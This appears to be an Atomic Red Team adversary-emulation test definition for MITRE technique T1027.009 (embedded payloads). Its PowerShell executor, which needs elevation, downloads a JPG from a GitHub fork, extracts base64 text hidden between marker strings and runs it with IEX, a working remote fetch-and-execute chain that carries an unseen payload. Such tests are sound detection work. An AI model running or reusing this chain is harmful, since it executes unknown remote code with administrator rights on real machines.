attack_technique: T1027.009
display_name: T1027.009 test
atomic_tests:
- name: T1027.009 test
  auto_generated_guid: 79a32094-d7b4-4346-965d-dff586f7a5c0
  description: |-
    test
  supported_platforms:
  - windows
  executor:
    command: |
      $imageUrl = 'https://github.com/crav3r/atomic-red-team/raw/round5test/atomics/T1027.009/bin/T1027.009.jpg';
      $webClient = New-Object System.Net.WebClient;
      $imageBytes = $webClient.DownloadData($imageUrl);
      $imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);
      $startFlag = '<<BASE64_START>>';$endFlag = '<<BASE64_END>>';
      $startIndex = $imageText.IndexOf($startFlag);
      $endIndex = $imageText.IndexOf($endFlag);
      $startIndex -ge 0 -and $endIndex -gt $startIndex;
      $startIndex += $startFlag.Length;
      $base64Length = $endIndex - $startIndex;
      $base64Command = $imageText.Substring($startIndex, $base64Length);
      $commandBytes = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($base64Command));
      IEX $commandBytes;
    name: powershell
    elevation_required: true
  